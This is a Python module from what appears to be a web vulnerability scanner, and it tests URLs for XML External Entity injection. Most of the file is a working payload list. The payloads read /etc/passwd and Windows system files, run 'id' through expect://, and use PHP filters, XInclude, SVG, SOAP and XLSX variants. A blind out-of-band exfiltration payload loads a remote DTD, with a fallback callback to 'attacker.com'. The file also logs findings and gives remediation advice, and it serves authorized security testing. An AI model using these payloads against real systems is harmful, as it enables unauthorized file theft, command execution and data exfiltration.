"""
modules/xxe.py
XML External Entity (XXE) Injection test module.

Covers: Classic file read, PHP wrappers, XInclude, SVG XXE,
SOAP, XLSX embedded, chunked/encoding bypass, error-based,
blind data exfil via DTD parameter entities, netdoc (Java), OOB.

Entry point: async def run(scanner) -> None

For Authorized Security Testing and CTF Competitions Only.
"""
from __future__ import annotations

from typing import TYPE_CHECKING

from core.models import Vulnerability, calculate_severity

if TYPE_CHECKING:
    from core.scanner import BaseScanner


def _build_payloads(oob_url: str):
    """Build the full XXE payload list, injecting the OOB callback URL."""
    return [
        # ── Classic file read ─────────────────────────────────────────────────
        ('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo '
         '[<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
         "application/xml", ["root:", "daemon:", "nobody:"]),
        ('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo '
         '[<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>',
         "application/xml", ["[extensions]", "[fonts]"]),
        ('<?xml version="1.0"?><!DOCTYPE foo '
         '[<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>',
         "application/xml", ["localhost", "server"]),
        ('<?xml version="1.0"?><!DOCTYPE foo '
         '[<!ENTITY xxe SYSTEM "file:///proc/version">]><root>&xxe;</root>',
         "application/xml", ["linux", "ubuntu", "debian"]),
        # ── PHP wrappers ──────────────────────────────────────────────────────
        ('<?xml version="1.0"?><!DOCTYPE foo '
         '[<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]>'
         '<foo>&xxe;</foo>',
         "application/xml", ["cm9vd", "root"]),
        ('<?xml version="1.0"?><!DOCTYPE foo '
         '[<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/hosts">]>'
         '<foo>&xxe;</foo>',
         "application/xml", ["MTI3LjA", "localhost"]),
        ('<?xml version="1.0"?><!DOCTYPE foo '
         '[<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
         "application/xml", ["uid=", "gid="]),
        # ── XInclude ─────────────────────────────────────────────────────────
        ('<root xmlns:xi="http://www.w3.org/2001/XInclude">'
         '<xi:include parse="text" href="file:///etc/passwd"/></root>',
         "application/xml", ["root:", "daemon:"]),
        ('<foo xmlns:xi="http://www.w3.org/2001/XInclude">'
         '<xi:include href="file:///etc/hostname" parse="text"/></foo>',
         "application/xml", ["localhost"]),
        # ── SVG XXE ───────────────────────────────────────────────────────────
        ('<?xml version="1.0" standalone="yes"?><!DOCTYPE test '
         '[<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
         '<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">'
         '<text font-size="16" x="0" y="16">&xxe;</text></svg>',
         "image/svg+xml", ["root:", "daemon:"]),
        # ── SOAP-style ────────────────────────────────────────────────────────
        ('<?xml version="1.0"?><!DOCTYPE foo '
         '[<!ENTITY xxe SYSTEM "file:///etc/hostname">]>'
         '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'
         '<soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>',
         "text/xml", ["root", "localhost"]),
        ('<?xml version="1.0"?><!DOCTYPE m '
         '[<!ENTITY file SYSTEM "file:///etc/passwd">]><m>&file;</m>',
         "text/xml", ["root:", "daemon:"]),
        # ── DTD Parameter Entity OOB ──────────────────────────────────────────
        (f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{oob_url}"> %xxe;]><root/>',
         "application/xml", []),
        (f'<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % remote SYSTEM "{oob_url}/dtd"> %remote;]><data/>',
         "application/xml", []),
        # ── XLSX embedded XXE ─────────────────────────────────────────────────
        ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE foo '
         '[<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
         '<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
         '<sheets><sheet name="Sheet1" sheetId="1"/>&xxe;</sheets></workbook>',
         "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
         ["root:", "daemon:"]),
        # ── Encoding bypass ───────────────────────────────────────────────────
        ('<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE foo '
         '[<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
         "application/xml; charset=utf-16", ["root:", "daemon:"]),
        # ── Error-based ───────────────────────────────────────────────────────
        ('<?xml version="1.0"?><!DOCTYPE foo '
         '[<!ENTITY xxe SYSTEM "file:///nonexistent/path/that/errors">]><root>&xxe;</root>',
         "application/xml", ["no such file", "failed to open", "nonexistent"]),  # V29: removed bare "error" (matches every JSON error response)
        # ── Blind data exfil via DTD ──────────────────────────────────────────
        (f'<?xml version="1.0"?><!DOCTYPE test '
         f'[<!ENTITY % file SYSTEM "file:///etc/passwd">'
         f'<!ENTITY % dtd SYSTEM "{oob_url}/evil.dtd"> %dtd; %send;]><root/>',
         "application/xml", []),
        # ── Netdoc (Java) ─────────────────────────────────────────────────────
        ('<?xml version="1.0"?><!DOCTYPE foo '
         '[<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">]><root>&xxe;</root>',
         "application/xml", ["root:", "daemon:"]),
    ]


async def run(scanner: "BaseScanner", url: str) -> None:
    """Test a single URL for XXE. Called per-URL by scan_url()."""
    await _test_xxe(scanner, url)


async def _test_xxe(scanner: "BaseScanner", url: str) -> bool:
    oob_id = scanner.oob_server.generate_identifier() if scanner.oob_server.running else None
    oob_url = scanner.oob_server.get_oob_url(oob_id) if oob_id else "http://attacker.com/xxe"

    # V29 FIX: baseline — signatures must be absent from uninjected response
    baseline = await scanner.make_request("GET", url)
    baseline_text = (baseline.text if baseline else "").lower()

    payloads = _build_payloads(oob_url)

    for payload, content_type, signatures in payloads:
        headers = {"Content-Type": content_type}
        res = await scanner.make_request("POST", url, data=payload, headers=headers)

        if res:
            # V29 FIX: only count signatures absent from the baseline response
            matched_sigs = [s for s in signatures if s.lower() in res.text.lower() and s.lower() not in baseline_text]
            oob_hit = oob_id and scanner.oob_server.check_interaction(oob_id, 3.0)

            if matched_sigs or oob_hit:
                evidence = f"Signatures: {matched_sigs}" if matched_sigs else "OOB callback received"
                n_indicators = len(matched_sigs) + (1 if oob_hit else 0)
                confidence_pct = min(95, 60 + n_indicators * 15)
                severity, cvss = calculate_severity("XXE")
                scanner.log_vuln(Vulnerability(
                    type="XXE" if matched_sigs else "Blind XXE",
                    url=url,
                    parameter="XML Body",
                    payload=payload[:120],
                    evidence=evidence,
                    confidence="High",
                    severity=severity,
                    cvss_score=cvss,
                    method="POST",
                    detection_method=f"XXE via {content_type}",
                    remediation=(
                        "Disable external entity processing in your XML parser. "
                        "Use a safe parser configuration (e.g., FEATURE_SECURE_PROCESSING). "
                        "Avoid deserializing XML from untrusted sources."
                    ),
                    references=["CWE-611", "OWASP-A05:2021"],
                    confidence_pct=confidence_pct,
                    indicators_matched=n_indicators,
                ))
                return True

    return False
